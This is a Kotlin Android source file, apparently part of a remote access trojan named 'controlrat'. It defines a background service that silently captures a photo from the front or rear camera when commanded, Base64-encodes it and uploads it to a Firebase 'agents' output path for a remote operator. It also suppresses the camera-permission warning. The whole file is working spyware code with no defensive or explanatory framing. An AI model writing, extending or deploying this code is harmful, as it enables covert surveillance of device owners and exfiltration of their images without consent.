package com.controlrat
import android.app.Service; import android.content.Intent; import android.hardware.camera2.*; import android.media.ImageReader; import android.os.*; import android.util.Base64; import com.google.firebase.database.FirebaseDatabase
class CameraService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val appId = intent?.getStringExtra("appid") ?: "unknown"; val lens = if (intent?.getStringExtra("lens") == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager; val camId = cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == lens }
        if (camId == null) { stopSelf(); return START_NOT_STICKY }
        val reader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
        reader.setOnImageAvailableListener({ r -> val img = r.acquireLatestImage(); val buf = img.planes[0].buffer; val b = ByteArray(buf.remaining()); buf.get(b); FirebaseDatabase.getInstance().getReference("agents/$appId/output/camera").setValue(Base64.encodeToString(b, Base64.NO_WRAP)); img.close(); stopSelf() }, Handler())
        try { @Suppress("MissingPermission") cm.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) { val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }; camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) { session.capture(req.build(), null, null) }
                override fun onConfigureFailed(session: CameraCaptureSession) { stopSelf() }
            }, null) }
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
        }, null) } catch (e: Exception) { stopSelf() }
        return START_NOT_STICKY
    }
    override fun onBind(i: Intent?) = null
}
